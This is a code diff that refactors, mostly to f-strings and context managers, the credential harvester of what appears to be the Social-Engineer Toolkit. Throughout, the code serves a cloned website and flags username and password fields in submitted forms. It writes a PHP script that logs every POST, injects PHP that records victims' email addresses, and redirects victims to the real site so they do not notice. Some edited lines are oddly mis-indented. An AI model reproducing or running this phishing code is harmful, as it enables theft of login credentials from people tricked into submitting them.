@@ -58,12 +58,9 @@ me = mod_name()
 sys.path.append(definepath)
 
 
-if not os.path.isfile("%s/src/logs/harvester.log" % (os.getcwd())):
-    filewrite = open("%s/src/logs/harvester.log" % (os.getcwd()), "w")
-    filewrite.write("")
-    filewrite.close()
-
-
+if not os.path.isfile(f"{os.getcwd()}/src/logs/harvester.log"):
+    with open(f"{os.getcwd()}/src/logs/harvester.log", "w") as filewrite:
+        filewrite.write("")
 # import the base setcore libraries
 from src.core.setcore import *
 
@@ -80,7 +77,7 @@ except Exception as err:
 
 
 attack_vector = ""
-fileopen = open(userconfigpath + "attack_vector", "r")
+fileopen = open(f"{userconfigpath}attack_vector", "r")
 for line in fileopen:
     line = line.rstrip()
     if line == 'multiattack':
@@ -106,13 +103,11 @@ fileopen = open("/etc/setoolkit/set.config", "r").readlines()
 counter = 0
 for line in fileopen:
     line = line.rstrip()
-    match = re.search("WEB_PORT=", line)
-    if match:
+    if match := re.search("WEB_PORT=", line):
         line = line.replace("WEB_PORT=", "")
         web_port = line
         counter = 1
-    match2 = re.search("COMMAND_CENTER=ON", line)
-    if match2:
+    if match2 := re.search("COMMAND_CENTER=ON", line):
         command_center = "on"
         command_center_write = open(
             userconfigpath + "cc_harvester_hit" % (userconfigpath), "w")
@@ -123,11 +118,10 @@ if counter == 0:
 
 # pull URL field
 counter = 0
-fileopen = open(userconfigpath + "site.template", "r").readlines()
+fileopen = open(f"{userconfigpath}site.template", "r").readlines()
 for line in fileopen:
     line = line.rstrip()
-    match = re.search("URL=", line)
-    if match:
+    if match := re.search("URL=", line):
         RAW_URL = line.replace("URL=", "")
         URL = line.replace("URL=http://", "")
         URL = line.replace("URL=https://", "")
@@ -161,44 +155,56 @@ for line in fileopen:
         for line in fileopen:
             # strip line feeds and carriage returns
             line = line.rstrip()
-            # begin search for flags we need
-            match = re.search("SELF_SIGNED_CERT=ON", line)
-            # if we hit, lets create our own certificate
-            if match:
+            if match := re.search("SELF_SIGNED_CERT=ON", line):
                 self_signed = "true"
                 # need to import our ssl module for creating a CA
                 sys.path.append("src/core/ssl")
                 # import our ssl module
                 import setssl
-                subprocess.Popen("cp %s/CA/*.pem %s" % (userconfigpath, userconfigpath),
-                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                subprocess.Popen(
+                    f"cp {userconfigpath}/CA/*.pem {userconfigpath}",
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    shell=True,
+                ).wait()
                 # remove old junk we dont need anymore
-                subprocess.Popen("rm -rf %s/CA;cp *.pem %s" % (userconfigpath, userconfigpath),
-                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                subprocess.Popen(
+                    f"rm -rf {userconfigpath}/CA;cp *.pem {userconfigpath}",
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    shell=True,
+                ).wait()
 
         # if user wants to specify his/her own PEM certificate
         if self_signed == "false":
             for line in fileopen:
                 line = line.rstrip()
-                # search for cert path
-                match = re.search("PEM_CLIENT=", line, flags=re.IGNORECASE)
-                if match:
+                if match := re.search(
+                    "PEM_CLIENT=", line, flags=re.IGNORECASE
+                ):
                     pem_client = line.replace("PEM_CLIENT=", "")
                     if not os.path.isfile(pem_client):
                         print("\nUnable to find PEM file, check location and config again.")
                         exit_set()
                     if os.path.isfile(pem_client):
-                        subprocess.Popen("cp %s %s/newcert.pem" % (pem_client, userconfigpath),
-                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
-                match2 = re.search("PEM_SERVER=", line)
-                if match2:
+                        subprocess.Popen(
+                            f"cp {pem_client} {userconfigpath}/newcert.pem",
+                            stdout=subprocess.PIPE,
+                            stderr=subprocess.PIPE,
+                            shell=True,
+                        ).wait()
+                if match2 := re.search("PEM_SERVER=", line):
                     pem_server = line.replace("PEM_SERVER=", "")
                     if not os.path.isfile(pem_server):
                         print("\nUnable to find PEM file, check location and config again.")
                         exit_set()
                     if os.path.isfile(pem_server):
-                        subprocess.Popen("cp %s %s/newreq.pem" % (pem_server, userconfigpath),
-                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                        subprocess.Popen(
+                            f"cp {pem_server} {userconfigpath}/newreq.pem",
+                            stdout=subprocess.PIPE,
+                            stderr=subprocess.PIPE,
+                            shell=True,
+                        ).wait()
 
 # url decode for postbacks
 def htc(m):
@@ -211,8 +217,8 @@ def urldecode(url):
     return rex.sub(htc, url)
 
 # here is where we specify how many people actually visited versus fell for it
-visits = open(userconfigpath + "visits.file", "a")
-bites = open(userconfigpath + "bites.file", "a")
+visits = open(f"{userconfigpath}visits.file", "a")
+bites = open(f"{userconfigpath}bites.file", "a")
 
 # SET Handler for handling POST requests and general setup through SSL
 class SETHandler(BaseHTTPRequestHandler):
@@ -240,10 +246,6 @@ class SETHandler(BaseHTTPRequestHandler):
             #print('-' * 40)
             #print('Exception happened during processing of request from', end=' ')
             print(client_address)
-            #import traceback
-            #traceback.print_exc()  # XXX But this goes to stderr!
-            #print('-' * 40)
-            pass
 
         webroot = os.path.abspath(os.path.join(userconfigpath, 'web_clone'))
         requested_file = os.path.abspath(os.path.join(webroot, os.path.relpath(self.path, '/')))
@@ -254,26 +256,25 @@ class SETHandler(BaseHTTPRequestHandler):
                 self.send_response(200)
                 self.send_header('Content_type', 'text/html')
                 self.end_headers()
-                fileopen = open(userconfigpath + "web_clone/index.html", "r")
+                fileopen = open(f"{userconfigpath}web_clone/index.html", "r")
                 for line in fileopen:
                     line = line.encode('utf-8')
                     self.wfile.write(line)
                 # write out that we had a visit
                 visits.write("hit\n")
-                # visits.close()
+                        # visits.close()
 
-            # used for index2
             elif self.path == "/index2.html":
                 self.send_response(200)
                 self.send_header('Content_type', 'text/html')
                 self.end_headers()
-                fileopen = open(userconfigpath + "web_clone/index2.html", "r")
+                fileopen = open(f"{userconfigpath}web_clone/index2.html", "r")
                 for line in fileopen:
                     line = line.encode('utf-8')
                     self.wfile.write(line)
                 # write out that we had a visit
                 visits.write("hit\n")
-                # visits.close()
+                        # visits.close()
 
             else:
                 if os.path.isfile(requested_file):
@@ -288,12 +289,9 @@ class SETHandler(BaseHTTPRequestHandler):
                     self.send_response(404)
                     self.end_headers()
 
-        # handle errors, log them and pass through
         except Exception as e:
             # log to set
             log(e)
-            # pass exceptions to keep going
-            pass
 
     # handle POST requests
     def do_POST(self):
@@ -306,46 +304,52 @@ class SETHandler(BaseHTTPRequestHandler):
         url = url.split("&")
         # change path to root for append on file
         os.chdir(homepath)
-        # put the params into site.template for later user
-        filewrite = open(userconfigpath + "site.template", "a")
-        filewrite.write("\n")
-        if not os.path.isfile("%s/src/logs/harvester.log" % (os.getcwd())):
-            filewrite3 = open("%s/src/logs/harvester.log" % os.getcwd(), "w")
-            filewrite3.write("")
-            filewrite3.close()
-        filewrite2 = open("%s/src/logs/harvester.log" % os.getcwd(), "a")
-        filewrite.write("\n\n")
-        print(bcolors.RED + "[*] WE GOT A HIT! Printing the output:\r" + bcolors.GREEN)
-        for line in url:
-            counter = 0
-            line = line.rstrip()
-            # if regular expression hit on user fields then do different
-            match = re.search(
-                "Email|email|login|logon|Logon|Login|user|username|Username|User", line)
-            if match:
-                print(bcolors.RED + "POSSIBLE USERNAME FIELD FOUND: " + line + "\r" + bcolors.GREEN)
-                counter = 1
-            match2 = re.search(
-                "pwd|pass|uid|uname|Uname|userid|userID|USER|USERNAME|PIN|pin|password|Password|secret|Secret|Pass", line)
-            if match2:
-                # if you don't want to capture a password, turn this off, note
-                # not an exact science
-                log_password = check_config("HARVESTER_LOG_PASSWORDS=")
-                if log_password.lower() == "on":
-                    print(bcolors.RED + "POSSIBLE PASSWORD FIELD FOUND: " + line + "\r" + bcolors.GREEN)
-                else:
-                    line = ""
-                counter = 1
-            filewrite.write(escape("PARAM: " + line + "\n"))
-            filewrite2.write(line + "\n")
-            # if a counter hits at 0 then print this line
-            if counter == 0:
-                print("PARAM: " + line + "\r")
-            # reset counter
-            counter = 0
+        with open(f"{userconfigpath}site.template", "a") as filewrite:
+            filewrite.write("\n")
+            if not os.path.isfile(f"{os.getcwd()}/src/logs/harvester.log"):
+                with open(f"{os.getcwd()}/src/logs/harvester.log", "w") as filewrite3:
+                    filewrite3.write("")
+            filewrite2 = open(f"{os.getcwd()}/src/logs/harvester.log", "a")
+            filewrite.write("\n\n")
+            print(bcolors.RED + "[*] WE GOT A HIT! Printing the output:\r" + bcolors.GREEN)
+            for line in url:
+                counter = 0
+                line = line.rstrip()
+                if match := re.search(
+                    "Email|email|login|logon|Logon|Login|user|username|Username|User",
+                    line,
+                ):
+                    print(
+                        f"{bcolors.RED}POSSIBLE USERNAME FIELD FOUND: {line}"
+                        + "\r"
+                        + bcolors.GREEN
+                    )
+                    counter = 1
+                if match2 := re.search(
+                    "pwd|pass|uid|uname|Uname|userid|userID|USER|USERNAME|PIN|pin|password|Password|secret|Secret|Pass",
+                    line,
+                ):
+                    # if you don't want to capture a password, turn this off, note
+                    # not an exact science
+                    log_password = check_config("HARVESTER_LOG_PASSWORDS=")
+                    if log_password.lower() == "on":
+                        print(
+                            f"{bcolors.RED}POSSIBLE PASSWORD FIELD FOUND: {line}"
+                            + "\r"
+                            + bcolors.GREEN
+                        )
+                    else:
+                        line = ""
+                    counter = 1
+                filewrite.write(escape(f"PARAM: {line}" + "\n"))
+                filewrite2.write(line + "\n")
+                        # if a counter hits at 0 then print this line
+                if counter == 0:
+                    print(f"PARAM: {line}" + "\r")
+                # reset counter
+                counter = 0
 
-        filewrite.write("BREAKHERE")
-        filewrite.close()
+            filewrite.write("BREAKHERE")
         filewrite2.close()
 
         if attack_vector != 'multiattack':
@@ -353,11 +357,10 @@ class SETHandler(BaseHTTPRequestHandler):
 
         # pull URL field
         counter = 0
-        fileopen = open(userconfigpath + "site.template", "r").readlines()
+        fileopen = open(f"{userconfigpath}site.template", "r").readlines()
         for line in fileopen:
             line = line.rstrip()
-            match = re.search("URL=", line)
-            if match:
+            if match := re.search("URL=", line):
                 RAW_URL = line.replace("URL=", "")
                 URL = line.replace("URL=http://", "")
                 URL = line.replace("URL=https://", "")
@@ -373,11 +376,13 @@ class SETHandler(BaseHTTPRequestHandler):
             counter = 1
 
         # when done posting send them back to the original site
-        redirect = ('<html><head><meta HTTP-EQUIV="REFRESH" content="0; url=%s"></head></html>' % (RAW_URL)).encode('utf-8')
+        redirect = f'<html><head><meta HTTP-EQUIV="REFRESH" content="0; url={RAW_URL}"></head></html>'.encode(
+            'utf-8'
+        )
         self.wfile.write(redirect)
 
         # set it back to our homepage
-        os.chdir(userconfigpath + "web_clone/")
+        os.chdir(f"{userconfigpath}web_clone/")
 
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
     """Handle requests in a separate thread."""
@@ -390,7 +395,6 @@ def run():
             server = ThreadedHTTPServer(('', int(web_port)), SETHandler)
             server.serve_forever()
 
-        # handle keyboard interrupts
         except KeyboardInterrupt:
             os.chdir(homepath)
             try:
@@ -409,12 +413,13 @@ def run():
             os.chdir(homepath)
             httpd.socket.close()
 
-        # handle the rest
         except Exception as e:
-            print(bcolors.RED + "[*] Looks like the web_server can't bind to 80. Are you running Apache or NGINX?" + bcolors.ENDC)
+            print(
+                f"{bcolors.RED}[*] Looks like the web_server can't bind to 80. Are you running Apache or NGINX?{bcolors.ENDC}"
+            )
             apache_stop = input("Do you want to attempt to disable Apache? [y/n]: ")
             apache_counter = 0
-            if apache_stop == "yes" or apache_stop == "y" or apache_stop == "":
+            if apache_stop in ["yes", "y", ""]:
                 if os.path.isfile("/etc/init.d/apache2"):
                     subprocess.Popen("/etc/init.d/apache2 stop", shell=True).wait()
                     apache_counter = 1
@@ -458,11 +463,11 @@ def run():
                     except Exception:
                         apache_counter = 0
 
-            #if apache_counter == 0:
-            #    print(bcolors.GREEN + "[*] Try disabling Apache and try SET again." + bcolors.ENDC)
-            #    print("[*] Printing error: " + str(e) + "\n")
-            #    return_continue()
-            #    exit_set()
+                    #if apache_counter == 0:
+                    #    print(bcolors.GREEN + "[*] Try disabling Apache and try SET again." + bcolors.ENDC)
+                    #    print("[*] Printing error: " + str(e) + "\n")
+                    #    return_continue()
+                    #    exit_set()
 
     # if we are using apache, then use the harvester php type that writes it out to post.php
     # note just change the index.html to post somewhere else and rename the
@@ -473,9 +478,6 @@ def run():
             ipaddr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             ipaddr.connect(('127.0.0.1', int(web_port)))
             ipaddr.settimeout(2)
-            if ipaddr:
-                pass
-
         except Exception as e:
             if os.path.isfile("/etc/init.d/apache2"):
                 apache_start = input("[!] Apache may be not running, do you want SET to start the process? [y/n]: ")
@@ -484,70 +486,93 @@ def run():
 
         try:
             apache_dir = check_config("APACHE_DIRECTORY=")
-            if os.path.isdir(apache_dir + "/html"):
-                apache_dir = apache_dir + "/html"
-            print(bcolors.GREEN + "Apache webserver is set to ON. Copying over PHP file to the website.")
+            if os.path.isdir(f"{apache_dir}/html"):
+                apache_dir = f"{apache_dir}/html"
+            print(
+                f"{bcolors.GREEN}Apache webserver is set to ON. Copying over PHP file to the website."
+            )
 
         except Exception as e:
             print(e)
 
         print("Please note that all output from the harvester will be found under apache_dir/harvester_date.txt")
-        print("Feel free to customize post.php in the %s directory" % (apache_dir) + bcolors.ENDC)
-        filewrite = open("%s/post.php" % (apache_dir), "w")
-        now = str(datetime.datetime.today())
-        harvester_file = ("harvester_" + now + ".txt")
-        filewrite.write("""<?php $file = '%s';file_put_contents($file, print_r($_POST, true), FILE_APPEND); \n/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */ ?><meta http-equiv="refresh" content="0; url=%s" />\n""" % (harvester_file, RAW_URL))
-        filewrite.close()
+        print(
+            f"Feel free to customize post.php in the {apache_dir} directory{bcolors.ENDC}"
+        )
+        with open(f"{apache_dir}/post.php", "w") as filewrite:
+            now = str(datetime.datetime.now())
+            harvester_file = f"harvester_{now}.txt"
+            filewrite.write("""<?php $file = '%s';file_put_contents($file, print_r($_POST, true), FILE_APPEND); \n/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */ ?><meta http-equiv="refresh" content="0; url=%s" />\n""" % (harvester_file, RAW_URL))
         if os.path.isdir("/var/www/html"):
             logpath = ("/var/www/html")
 
-        filewrite = open("%s/%s" % (logpath, harvester_file), "w")
-        filewrite.write("")
-        filewrite.close()
-
+        with open(f"{logpath}/{harvester_file}", "w") as filewrite:
+            filewrite.write("")
         # Check sys platform to perform chown
         if sys.platform == "darwin":
-            subprocess.Popen("chown _www:_www '%s/%s'" % (logpath, harvester_file), shell=True).wait()
+            subprocess.Popen(
+                f"chown _www:_www '{logpath}/{harvester_file}'", shell=True
+            ).wait()
         else:
-            subprocess.Popen("chown www-data:www-data '%s/%s'" % (logpath, harvester_file), shell=True).wait()
+            subprocess.Popen(
+                f"chown www-data:www-data '{logpath}/{harvester_file}'",
+                shell=True,
+            ).wait()
 
         # if we are using webjacking, etc.
-        if os.path.isfile(userconfigpath + "web_clone/index2.html"):
+        if os.path.isfile(f"{userconfigpath}web_clone/index2.html"):
             # need to copy the files over - remove the old one first if there
-            if os.path.isfile(apache_dir + "/index2.html"):
-                os.remove(apache_dir + "/index2.html")
+            if os.path.isfile(f"{apache_dir}/index2.html"):
+                os.remove(f"{apache_dir}/index2.html")
 
-            shutil.copyfile(userconfigpath + "web_clone/index2.html", apache_dir + "/index2.html")
+            shutil.copyfile(
+                f"{userconfigpath}web_clone/index2.html",
+                f"{apache_dir}/index2.html",
+            )
 
         # here we specify if we are tracking users and such
         if track_email == True:
-            fileopen = open(userconfigpath + "web_clone/index.html", "r")
+            fileopen = open(f"{userconfigpath}web_clone/index.html", "r")
             data = fileopen.read()
             data = data.replace("<body>", """<body><?php $file = '%s'; $queryString = ''; foreach ($_GET as $key => $value) { $queryString .= $key . '=' . $value . '&';}$query_string = base64_decode($queryString);file_put_contents($file, print_r("Email address recorded: " . $query_string . "\\n", true), FILE_APPEND);?>""" % (harvester_file))
-            filewrite = open(userconfigpath + "web_clone/index.2", "w")
-            filewrite.write(data)
-            filewrite.close()
-            os.remove(userconfigpath + "web_clone/index.html")
-            shutil.copyfile(userconfigpath + "web_clone/index.2", userconfigpath + "web_clone/index.html")
+            with open(f"{userconfigpath}web_clone/index.2", "w") as filewrite:
+                filewrite.write(data)
+            os.remove(f"{userconfigpath}web_clone/index.html")
+            shutil.copyfile(
+                f"{userconfigpath}web_clone/index.2",
+                f"{userconfigpath}web_clone/index.html",
+            )
             # copy the entire web_clone directory.
             # Without this only index.php|html are copied even though the user
             # may have chosen to import the entire directory in the set module.
-            copyfolder(userconfigpath + "web_clone", apache_dir)
-        if os.path.isfile("%s/index.html" % (apache_dir)): os.remove("%s/index.html" % (apache_dir))
-        if track_email == False: shutil.copyfile(userconfigpath + "web_clone/index.html", "%s/index.html" % (apache_dir))
+            copyfolder(f"{userconfigpath}web_clone", apache_dir)
+        if os.path.isfile(f"{apache_dir}/index.html"):
+            os.remove(f"{apache_dir}/index.html")
+        if track_email == False:
+            shutil.copyfile(
+                f"{userconfigpath}web_clone/index.html",
+                f"{apache_dir}/index.html",
+            )
         if track_email == True:
-            shutil.copyfile(userconfigpath + "web_clone/index.html", "%s/index.php" % (apache_dir))
+            shutil.copyfile(
+                f"{userconfigpath}web_clone/index.html",
+                f"{apache_dir}/index.php",
+            )
             print_status("NOTE: The URL to click on is index.php NOT index.html with track emails.")
-        print_status("All files have been copied to %s" % (apache_dir))
+        print_status(f"All files have been copied to {apache_dir}")
         if attack_vector != 'multiattack':
             try:
                 print_status("SET is now listening for incoming credentials. You can control-c out of this and completely exit SET at anytime and still keep the attack going.")
-                print_status("All files are located under the Apache web root directory: " + apache_dir)
+                print_status(
+                    f"All files are located under the Apache web root directory: {apache_dir}"
+                )
                 print_status("All fields captures will be displayed below.")
                 print("[Credential Harvester is now listening below...]\n\n")
-                tail(apache_dir + "/" + harvester_file)
+                tail(f"{apache_dir}/{harvester_file}")
             except KeyboardInterrupt:
-                print_status("Exiting the menu - note that everything is still running and logging under your web directory path: " + apache_dir)
+                print_status(
+                    f"Exiting the menu - note that everything is still running and logging under your web directory path: {apache_dir}"
+                )
             pause = input("{Press return to continue}")
 
 class SecureHTTPServer(HTTPServer):
@@ -584,7 +609,7 @@ def ssl_server(HandlerClass=SETHandler, ServerClass=SecureHTTPServer):
         # serve the httpd server until exit
         httpd.serve_forever()
     except Exception as e: 
-        print_error("Something went wrong.. Printing error: " + str(e))
+        print_error(f"Something went wrong.. Printing error: {str(e)}")
 
 if track_email == True:
     webattack_email = True
